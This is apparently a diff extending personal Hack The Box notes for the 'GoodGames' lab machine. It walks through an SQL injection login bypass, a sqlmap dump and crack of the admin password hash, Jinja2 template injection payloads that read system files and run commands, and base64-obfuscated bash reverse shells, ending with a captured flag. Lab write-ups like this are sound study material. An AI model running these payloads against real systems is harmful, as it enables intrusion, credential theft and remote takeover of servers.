@@ -14,12 +14,117 @@ Service Info: Host: goodgames.htb
 http://goodgames.htb/login
 SQLI cheat shett >> https://github.com/payloadbox/sql-injection-payload-list
 
-BURPSUITE
+[+]BURPSUITE[+]
 email=admin ' OR 1 -- -&password=password
 Login sucessfull
++ save a request >> goodgames.req +
+http://10.10.11.130/login
+email=admin@goodgames.htb&password=password (edited request)
++save request + 
 
 [+]COOKIE SESSION ADMIN[+]
 Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.YofFJA.PIKVlJEqQw7qIvuzHpUrWILG-ms
 
+[+]CREDENTIALS[+]
+Nick: admin
+Email: admin@goodgames.htb
+Password : superadministrator
 
-[+]SQLmap[+]
+[+]SQLmap[+] [+]https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/[+]
++ sqlmap -r goodgames.req  (-r = load http request from file).
+
+[21:30:44] [INFO] parsing HTTP request from 'goodgames.req'
+
+Parameter: email (POST)
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: email=admin@goodgames.htb' AND (SELECT 6726 FROM (SELECT(SLEEP(5)))hgJk) AND 'hGoc'='hGoc&password=password
+
+[21:30:44] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+
+
++ sqlmap -r goodgames.req --dbs --batch   (--dbs= databases / --batch= no input for user). 
+available databases [2]:
+[*] information_schema
+[*] main
+
+
++ sqlmap -r goodgames.req  --tables -D main --batch  (-D = database / --tables = mostrar tablas)
+Database: main
+[3 tables]
++---------------+
+| user          |
+| blog          |
+| blog_comments |
++---------------+
+
++ sqlmap -r goodgames.req  --batch --dump -T user -D main  (--dump = arrojar informacion / -T = tabla / -D = database)
+Database: main                                                                                
+Table: user
+[1 entries]
++----+-------+---------------------+-----------------------------------------+
+| id | name  | email               | password                                |
++----+-------+---------------------+-----------------------------------------+
+| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec        | |
++----+-------+---------------------+-----------------------------------------+
+
+[+]CRACKING CREDENTIALS[+]
+2b22337f218b2d82dfc3b6f77e7cb8ec
+MD5SUM = superadministrator
+
+
+[+]    X     [+]
+This hash is for admin account in the login page, we have credentials!
+http://10.10.11.130/login
+email : admin@goodgames.htb
+pass : superadministrator
+
++ In the Profile section we have new url redirection ...
+http://internal-administration.goodgames.htb/
+add new route to host
+
++ http://internal-administration.goodgames.htb/login +
+Another login with same credentials ...
+Username : admin
+Password : superadministrator
+
+whatweb >> flask 2.0.2 
++Vulnerable to SSTI+
+
+[+]SSTI[+]
+A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.
+Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.
+
++ github https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
++ hacktricks https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#python
+
+[+]Exploting SSTI  by  READ REMOTE FILES
++  {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }} >> /etc/hosts
++ {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} >> root
+
+
+[+]Exploit the SSTI by remote code execution
+https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
+
+
+[+]Exploit the SSTI by calling subprocess.Popen[+]
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} >>  backend bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+
+
+[+][++]Exploit SSTI without ""[+][++]
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
+output >> a
+
+echo 'bash -c "bash -i >& /dev/tcp/192.10.10.10/4444 0>&1"' | base64
+PAYLOAD BASE64 >> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDQ0IDA+JjEiCg==
+
++++++REVERSHELL+++++
+{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDQ0IDA+JjEiCg== | base64 -d | bash")["read"]() %} a {% endwith %}
+
+[+]P0WN3ED[+]
+root@3a453ab39d3d:/home/augustus# cat user.txt
+cat user.txt
+5f13d28eb7e3d67bc5f3e9968004aaf1
+
+[+]PRIVILAGE ESCALATION[+]
